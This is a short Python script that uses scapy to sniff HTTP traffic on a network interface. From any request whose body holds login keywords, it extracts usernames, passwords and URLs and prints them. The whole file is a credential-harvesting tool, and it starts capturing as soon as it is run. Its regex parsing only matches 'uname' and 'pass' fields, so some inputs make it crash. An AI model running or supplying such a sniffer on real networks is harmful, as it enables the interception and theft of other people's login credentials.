import scapy.all as scapy
from scapy.layers import http
import re


def sniffing(interface_number):
    scapy.sniff(iface=interface_number, store=False, prn=http_output)


def http_output(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            url = extract_url(packet)
            credentials = extract_credentials(packet)
            if credentials and url:
                uname = re.search(r"uname=([^&]*)", credentials).group(1)
                password = re.search(r"pass=([^&]*)", credentials).group(1)
                
                print(f"{'Username':<20} {'Password':<20} {'URL Address':<50}")
                print(f"{uname:<20} {password:<20} {url:<50}")


def extract_url(packet):
    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()


def extract_credentials(packet):
    load = packet[scapy.Raw].load.decode()
    sensitive_keyword_list = ['uname', 'pass', 'username', 'password']
    for key_word in sensitive_keyword_list:
        if key_word in load:
            return load



sniffing("eth0")
